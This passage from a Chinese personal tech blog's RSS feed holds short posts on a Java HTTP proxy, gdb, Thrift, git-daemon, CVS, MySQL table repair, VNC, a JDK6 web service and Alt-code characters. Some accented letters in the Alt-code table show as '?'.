is0.read(bytes)) &gt; 0) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;os0.write(bytes, 0, ir);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (logging)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;writeLog(bytes, 0, ir, true);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} else if (ir &lt; 0)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} catch (InterruptedIOException e) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;try {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if ((ir = is1.read(bytes)) &gt; 0) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;os1.write(bytes, 0, ir);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (logging)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;writeLog(bytes, 0, ir, false);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} else if (ir &lt; 0)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} catch (InterruptedIOException e) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} catch (Exception e0) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;System.out.println("PipeException: " + e0);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;}<br><br>&nbsp;&nbsp; &nbsp;static public void startProxy(int port, Class clobj) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;ServerSocket ssock;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;Socket sock;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;try {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;ssock = new ServerSocket(port);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while (true) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;Class[] sarg = new Class[1];<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;Object[] arg = new Object[1];<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sarg[0] = Socket.class;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;try {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;java.lang.reflect.Constructor cons = clobj<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;.getDeclaredConstructor(sarg);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;arg[0] = ssock.accept();<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;cons.newInstance(arg); // Create HttpProxy or sons<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} catch (Exception e) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;Socket esock = (Socket) arg[0];<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;try {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;esock.close();<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} catch (Exception ec) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} catch (IOException e) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;}<br><br>&nbsp;&nbsp; &nbsp;// test<br>&nbsp;&nbsp; &nbsp;static public void main(String args[]) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;System.out.println("start in 8080\n");<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;JavaProxyTest.log = System.out;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;JavaProxyTest.logging = false;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;JavaProxyTest.startProxy(8080, JavaProxyTest.class);<br>&nbsp;&nbsp; &nbsp;}<br>}<br><br>Client:<br>import java.io.BufferedReader;<br>import java.io.InputStreamReader;<br>import java.net.URL;<br>import java.net.URLConnection;<br>import java.util.Properties;<br><br>public class Test {<br>&nbsp;&nbsp; &nbsp;public static void main(String args[]) throws Exception {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;String strUrl = "http://blog.csdn.net/cqq/";<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;URL url = new URL(strUrl);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;URLConnection conn = url.openConnection();<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;String strProxy = "127.0.0.1";//"198.133.224.145";<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;String strPort = "8080";//"3128";<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;Properties systemProperties = System.getProperties();<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;systemProperties.setProperty("http.proxyHost", strProxy);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;systemProperties.setProperty("http.proxyPort", strPort);<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;BufferedReader rd = new BufferedReader(new InputStreamReader(conn<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;.getInputStream()));<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;String ss = "";<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while (( ss = rd.readLine()) != null) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;System.out.println(ss);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;rd.close();<br><br>&nbsp;&nbsp; &nbsp;}<br>}<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200833013844282/</guid>
    </item>
    <item>
      <title>
<![CDATA[gdb常用命令]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201082403726994/</link>
      <description>
<![CDATA[编译时使用-g选项，才可以执行gdb操作<br>cc -g test.c<br>gdb a.out<br>设置命令行参数<br>set args 8 7 hello<br><br>设置条件断点<br>break 24 if i==8<br>显示断点<br>info break<br>删除断点<br>delete break 1<br>delete break<br><br>显示变量值<br>p name<br>显示变量类型<br>whatis name<br><br>监视变量<br>watch i<br>退出循环<br>util]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201082403726994/</guid>
    </item>
    <item>
      <title>
<![CDATA[[Fw]农历和阳历转换表的由来]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009111005529309/</link>
      <description>
<![CDATA[<P>几乎所有的农历转换都是用的一个转换表，这个转换表是怎么得来的呢？公式如下：</P>  <P>转自 <A rel="nofollow" href="http://blog.chinaunix.net/u/25381/showart_199977.html"  >http://blog.chinaunix.net/u/25381/showart_199977.html</A></P>  <P>一、节气的计算<BR>　　先给节气进行编号，从近日点开始的第一个节气编为0，编号如下及其相应的月份如下：<BR>0 小寒 腊月<BR>1 大寒 腊月<BR>2 立春&nbsp; 正月<BR>...</P>  <P>把当天和1900年1月0日（星期日）的差称为积日，那么第y年（1900年算第0年）第x 个节气的积日是<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; F = 365.242 * y + 6.2 + 15.22 * x - 1.9 * sin(0.262 * x)<BR>这个公式的误差在0.05天左右。<BR>二、朔日的计算<BR>　　从1900年开始的第m个朔日的公式是<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; M = 1.6 + 29.5306 * m + 0.4 * sin(1 - 0.45058 * m)<BR>这个公式的误差在0.2天左右。<BR>三、年份的确定<BR>　　1864年1月0日是农历癸亥年，所以用当年减去1864，用10除得的余数作为年份天干的，用12除得的余数作为年份的地支，数字对应的天干和地支如下。<BR>当年的1月0日换算为积日，可以用年份减去1900得到的年数被4整除，所得商数作为 y(D4)，余数作为y(M4)，y(M4)为零的年份是公历闰年，积日是<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D(1) = 1461 * y(D4) - 1<BR>y(M4)不为零的年份是公历平年，积日是<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D(1) = 1461 * y(D4) + 365 * y(M4)<BR>四、月份的确定<BR>　　计算前一年冬至的积日F(0)，并用F(0)计算冬至所在的朔月m及其朔日M(0)，就可以推算冬至的农历日期，冬至所在的农历月份总是十一月。计算下一个中气F(1)和下一个朔日M(1)，如果F(1)&lt;M(1)，那么该月就是上一个月的闰月，并把这个中气作为F(2)，以后的中气、朔日和农历月份也这样确定。</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009111005529309/</guid>
    </item>
    <item>
      <title>
<![CDATA[ubuntu上编译Thrift]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010512115826446/</link>
      <description>
<![CDATA[Thrift是Apache的一个开源项目，用来实现不同语言之间的通信，要使用编程语言操作cassandra，就需要Thrift。<br>可惜的是Ubuntu还不能使用apt-get安装Thrift，因此需要手工编译<br>编译环境：Ubuntu 8.10 (8.04的libtool包不能用)<br>首先安装必要的包<br>sudo apt-get install build-essential<br>sudo apt-get install bison flex <br>sudo apt-get install libboost-dev python-dev<br>sudo apt-get install autoconf automake libtool pkg-config<br>sudo apt-get install git<br>然后下载Thrift的源码包，并编译安装 <br>wget http://labs.renren.com/apache-mirror/incubator/thrift/0.2.0-incubating/thrift-0.2.0-incubating.tar.gz<br>tar xf thrift-0.2.0-incubating.tar.gz<br>cd thrift-0.2.0<br>./configure<br>make<br>sudo make install<br>安装成功，<br><br>使用Python进行测试<br>cd tutorial<br>thrift --gen py thrift.thrift<br>thrift --gen py shared.thrift<br>cp py/* gen-py<br>cd gen-py<br>python PythonServer.py &amp;<br>python PythonClient.py]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010512115826446/</guid>
    </item>
    <item>
      <title>
<![CDATA[程序员的幽默uml_switch崩溃后]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720100943835158/</link>
      <description>
<![CDATA[uml_switch被kill -9 干掉了，然后uml_switch给出如下提示信息：<br><span style="font-weight: bold;">Suddenly the Dungeon collapses!! - You die...</span><br>地下城塌了，你挂了！<br><br>Dungeon：《Dungeon Runners》是NCSOFT北美分公司开发的MMORPG，游戏以幻想世界为舞台，玩家在地面和地牢中进行探险，完成游戏任务。<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720100943835158/</guid>
    </item>
    <item>
      <title>
<![CDATA[使用STL的sort]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720105612830308/</link>
      <description>
<![CDATA[qsort的第三个参数的函数原型是<br>int cmp(const void *p1, const void *p2)<br>而STL的sort方法可以用第三个参数，也可以直接为结构体增加方法<br>bool operator &lt; (const struct X &amp;x) const{<br>&nbsp;///...<br>}<br><br>#include &lt;algorithm&gt;<br>using namespace std;<br><br>struct X{<br>&nbsp;int v;<br>&nbsp;bool operator &lt; (const struct X &amp;x){<br>&nbsp; return v &lt; x.v;<br>&nbsp;}<br>}xs[5];<br>int main(){<br>&nbsp; sort(&amp;xs[0], &amp;xs[5]);<br>&nbsp; return 0;<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>C/C++</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720105612830308/</guid>
    </item>
    <item>
      <title>
<![CDATA[后悔当初没有使用CVS]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200786115943386/</link>
      <description>
<![CDATA[<P>刚开始徐就提出使用CVS来控制我们的协同，可是我当时觉得用CVS太麻烦，而且每个人的模块都基本独立，因此提议大家自己控制版本。在Ftp上用版本编号的方式，现在随着程序越来越多，越来越后悔当时的决定。</P>
<P>昨天晚上配置了一下CVS，记之：</P>
<P>首先安装CVS服务器，这里用的是Windows下的cvsnt--Concurrent Versions System 2.0.58d；安装过程很简单，想Windows下的多数软件一样，下一步就行了，安装完成后配置：打开Service Control Panel，在Repositories选项卡中设置根目录（eg:/CVS E:/ide/eclipse/CVS），然后为了能通过Eclipse使用，需要在Compatibility选项卡中选中第一个CheckBox，（这个好像不用选也可以）。</P>
<P>然后就可以通过Eclipse来使用了，新建工程，然后右击工程-〉Team-〉ShareProject，用户名和密码是Windows帐户和密码，然后就可以用Team-〉Submit来更新到CVS系统中。</P>
<P>然后用Eclipse新建工程-〉CVS-〉CVS Project 签出项目。</P>
<P>然后可以用Team-〉Show History来查看历史信息，选中不同的几个版本，然后Compare来比较。</P>
<P>Concurrent Version System！</P>
<P>&nbsp;</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200786115943386/</guid>
    </item>
    <item>
      <title>
<![CDATA[MySQL终于扛不住了marked as crashed and should be repaired]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720106753957549/</link>
      <description>
<![CDATA[python爬虫天以大约2M/s的速度连续14抓网页，并保存到MySQL数据表里，今天终于扛不住挂掉了<br>两个数据表，一个4.29G，一个4.17G，错误信息如下：<br>&nbsp; File "build\bdist.win32\egg\MySQLdb\cursors.py", line 174, in execute<br>&nbsp; File "build\bdist.win32\egg\MySQLdb\connections.py", line 36, in defaulterrorhandler<br>_mysql_exceptions.InternalError: (145, "Table '.\\xiaonei\\user' is marked as crashed and should be repaired")<br>很明显，是数据表出错了，应该不是程序错误，很可能就是硬盘顶不住了，或者MySQL的问题，<br>mysql&gt; use xiaonei;<br>mysql&gt; select count(*) from user;<br>ERROR 145 (HY000): Table '.\xiaonei\user' is marked as crashed and should be repaired<br>用得是MYISAM存储引擎，解决方式很简单，进入数据表存储路径，执行myisamchk命令修复就可以了，根据上面的提示信息是xiaonei数据库的user表坏了，进入xiaonei目录，执行myisamchk -r user命令，这里的C:\ProgramData\MySQL\MySQL Server 5.1\data\是Win7下的MySQL默认安装路径，在WinXP下应该是C:\Program Files\MySQL\MySQL Server 5.1\data\，在unt.10下是/var/lib/mysql<br>C:\ProgramData\MySQL\MySQL Server 5.1\data\xiaonei&gt;myisamchk -r user<br>- recovering (with sort) MyISAM-table 'user'<br>Data records: 40126243<br>- Fixing index 1<br>Wrong bytesec:&nbsp;&nbsp; 0-&nbsp; 0-&nbsp; 0 at 4605839108; Skipped<br>Data records: 40126222<br>修复完成<br>可以看出：共40126243条记录，在4605839108条的地方出现了错误，修复完成后剩下40126222条记录，损失了21条记录。]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>DataBase</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720106753957549/</guid>
    </item>
    <item>
      <title>
<![CDATA[git]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201032191432747/</link>
      <description>
<![CDATA[<style>body { font-family:tahoma; font-size:10pt } p { font-family:tahoma; font-size:10pt } div { font-family:tahoma; font-size:10pt } td { font-family:tahoma; font-size:10pt } </style>git与git-daemon<br>ssh方式<br><span style="font-weight: bold;">Client:</span><br>ssh-keygen<br><span style="font-weight: bold;">Server:</span><br>sudo adduser git<br>su git<br>cat hank.pub &gt;&gt; .ssh/authrized_keys<br>mkdir gitproj<br>cd gitproj<br>git -bare&nbsp; init<br><span style="font-weight: bold;">Client:<br></span>mkdir gitproj<br>git remote add origin git@myserver:/home/git/gitproj<br>git push origin master<br><br>git-daemon方式<br><div>1. 安装git与git-daemon</div>
<div>sudo apt-get install git-core git-daemon-run</div>
<div>&nbsp;</div>
<div>2. 配置git-daemon</div>
<div><font face="monospace">sudo vi /etc/sv/git-daemon/run</font></div>
<div><font face="monospace">#!/bin/sh<br>exec 2&gt;&amp;1<br>echo 'git-daemon starting.'<br>exec git-daemon --verbose --export-all --base-path=/var/git --enable=receive-pack</font></div>
<div>sudo /etc/init.d/git-daemon restart</div>
<div>&nbsp;</div>
<div>3.创建项目</div>
<div><strong>Server:</strong></div>
<div>cd /var/git</div>
<div>mkdir hankjin</div>
<div>cd hankjin</div>
<div>git init</div>
<div>touch hello.c</div>
<div>git add hello.c</div>
<div>git commit -m "hello"</div>
<div>&nbsp;</div>
<div><strong>Client:</strong></div>
<div>cd /home/hankjin/git</div>
<div>git clone git://localhost/hankjin</div>
<div>cd hankjin</div>
<div>git pull</div>
<div>vi hello.c</div>
<div>git add .</div>
<div>git commit</div>
<div>git push</div>
<div>&nbsp;</div>
<div><strong>Server:</strong></div>
<div>git reset --hard<br><br><span style="font-weight: bold;">常见错误：</span><br>1.git fatal: The remote end hung up unexpectedl<br>
检查<font face="monospace">/etc/sv/git-daemon/run的--base-path参数</font>，确保和server的git目录相同<br>2.git fatal no matching remote head<br>server上如果没有任何commit，则会出现该错误<br>3.git 'receive-pack': service not enabled for<br><font face="monospace">在/etc/sv/git-daemon/run的git-daemon命令中加入： --enable=receive-pack</font><br></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201032191432747/</guid>
    </item>
    <item>
      <title>
<![CDATA[test]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200771713245917/</link>
      <description>
<![CDATA[<DIV><FONT face=Verdana><FONT size=2>email blog</FONT></FONT></DIV>
<DIV><FONT size=2></FONT>&nbsp;</DIV>
<DIV align=left><FONT size=2>
<HR style="WIDTH: 122px; HEIGHT: 2px" SIZE=2>
</FONT></DIV>
<DIV><FONT color=#c0c0c0><FONT size=2>黄进东</FONT></FONT></DIV>
<DIV><FONT size=2>2007-08-17</FONT></DIV>
<TABLE cellSpacing=0 border=0>
<TBODY></TBODY></TABLE>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200771713245917/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu8.04 VNC4server]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720084143421219/</link>
      <description>
<![CDATA[sudo apt-get install vnc4server<br>vnc4server<br>vnc4server stop<br>vnc4server -kill:1<br>vi ~/.vnc/xstartup<br>#twm &amp;<br>gnome-session &amp;<br>vnc4server<br><br>logon from windows, port:5901<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720084143421219/</guid>
    </item>
    <item>
      <title>
<![CDATA[执行本地命令并获取输出]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372007101731115771/</link>
      <description>
<![CDATA[<P>&nbsp;&nbsp;String s1 = "ipconfig /all";<BR>&nbsp;&nbsp;//相当执行本地命令ipconfig/all<BR>&nbsp;&nbsp;Process process = Runtime.getRuntime().exec(s1); <BR>&nbsp;&nbsp;BufferedReader bufferedreader = new BufferedReader(new <BR>&nbsp;&nbsp;&nbsp;InputStreamReader(process.getInputStream()));<BR>&nbsp;&nbsp;String line = bufferedreader.readLine();<BR>&nbsp;&nbsp;//筛选出Mac地址<BR>&nbsp;&nbsp;while(line != null) {<BR>&nbsp;&nbsp;&nbsp;line = bufferedreader.readLine();<BR>&nbsp;&nbsp;&nbsp;System.out.println(line);<BR>&nbsp;&nbsp;}<BR>&nbsp;&nbsp;bufferedreader.close();<BR>&nbsp;&nbsp;process.waitFor();</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372007101731115771/</guid>
    </item>
    <item>
      <title>
<![CDATA[JDK6－原生的WebService]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720076115355444/</link>
      <description>
<![CDATA[<P>JDK1.6原生支持WebService。</P>  <P>不用任何集成环境，也不用J2EE服务器，只要一个1.6的JDK，就可以开发WebService了。而且相当方便简捷。</P>  <P>1.编写WebService Hello.java</P>  <P>2.编译WebService javac Hello.java</P>  <P>3.发布WebService&nbsp; java Hello</P>  <P>4.测试WebService <A rel="nofollow" href="http://localhost:8080/HelloService?wsdl"  >http://localhost:8080/HelloService?wsdl</A></P>  <P>5.获得WebService接口 wsimport -keep&nbsp; <A rel="nofollow" href="http://localhost:8080/HelloService?wsdl"  >http://localhost:8080/HelloService?wsdl</A></P>  <P>6.编写WebClient Test.java</P>  <P>7.编译，运行 javac Test.java; java Test</P>  <P>//Hello.java</P>  <P>package cn.hjz;</P>  <P>import javax.jws.WebMethod;<BR>import javax.jws.WebService;<BR>import javax.jws.soap.SOAPBinding;</P>  <P>@WebService(targetNamespace = "<A rel="nofollow" href="http://hjz.cn/test"  >http://hjz.cn/test</A>")<BR>@SOAPBinding(style = SOAPBinding.Style.RPC)<BR>public class Hello {<BR>&nbsp;@WebMethod<BR>&nbsp;public String sayHello(String name) {<BR>&nbsp;&nbsp;return "hello:" + name;<BR>&nbsp;}<BR>&nbsp;public static void main(String[] args){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Endpoint.publish("<A rel="nofollow" href="http://localhost:8080/HelloService"  >http://localhost:8080/HelloService</A>", new Hello());<BR>&nbsp;&nbsp;&nbsp; }<BR>}<BR></P>  <P>//Test.java</P>  <P><SPAN style="COLOR: rgb(0,0,255);"  ><FONT color="#000000" >package org.hermit.study.jdk.client.test;</FONT></SPAN></P>  <P><SPAN style="COLOR: rgb(0,0,255);"  ><FONT color="#000000" >import cn.hjz.test.Hello;<BR>import cn.hjz.test.HelloService;</FONT></SPAN></P>  <P><SPAN style="COLOR: rgb(0,0,255);"  ><FONT color="#000000" ><BR>public class Test {<BR>&nbsp;&nbsp;&nbsp; public static void main(String[] args) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; HelloService service = new HelloService();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hello _hello = service.getHelloPort();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println(_hello.sayHello("hankjin"));<BR>&nbsp;&nbsp;&nbsp; }<BR>}</FONT></SPAN></P><SPAN style="COLOR: rgb(0,0,255);"  ><FONT color="#000000" >  <P></P></FONT></SPAN>&nbsp;]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720076115355444/</guid>
    </item>
    <item>
      <title>
<![CDATA[富文本编辑器FCKeditor]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372008441042788/</link>
      <description>
<![CDATA[<P><A rel="nofollow" href="http://www.fckeditor.net/download/"  >http://www.fckeditor.net/download/</A></P>  <P>很好的支持JSP，可以在JSP中做HTML编辑器。</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372008441042788/</guid>
    </item>
    <item>
      <title>
<![CDATA[用Alt打出特殊字符]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009929102047159/</link>
      <description>
<![CDATA[<h2>Letters with Accents</h2>           <p>This list is organized by <b>Accent</b> type. To determine the appropriate         numeric co<wbr>de, match the accent with the vowel. See the <a rel="nofollow" href="http://tlt.its.psu.edu/suggestions/international/bylanguage/index.html"  >individual By Language pages</a> to see how to handle other accents. </p>                  <table border="0"  cellpadding="5"  cellspacing="0"  >        <tbody><tr>          <th scope="col"  >Accent</th>          <th scope="col"  >A</th>          <th scope="col"  >E</th>          <th scope="col"  >I</th>          <th scope="col"  >O</th>          <th scope="col"  >U</th>          <th scope="col"  >Y</th>        </tr>        <tr>          <th scope="row"  >Grave<span><br>        (Cap)</span></th>          <td><b>?</b><br>        0192</td>          <td><b>?</b> <br>        0200</td>          <td><b>?</b><br>        0204</td>          <td><b>?</b><br>        0210</td>          <td><b>?</b> <br>        0217</td>          <td>&nbsp;</td>        </tr>        <tr>          <th scope="row"  >Grave (Lower)</th>          <td><b>à</b><br>        0224</td>          <td><b>è</b><br>        0232</td>          <td><b>ì</b><br>        0236</td>          <td><b>ò</b><br>        0242</td>          <td><b>ù</b><br>        0249</td>          <td>&nbsp;</td>        </tr>        <tr>          <th scope="row"  >Acute <span><br>        (Cap)</span></th>          <td><b>?</b><br>        0193</td>          <td><b>?</b><br>        0201</td>          <td><b>?</b><br>        0205</td>          <td><b>?</b><br>        0211</td>          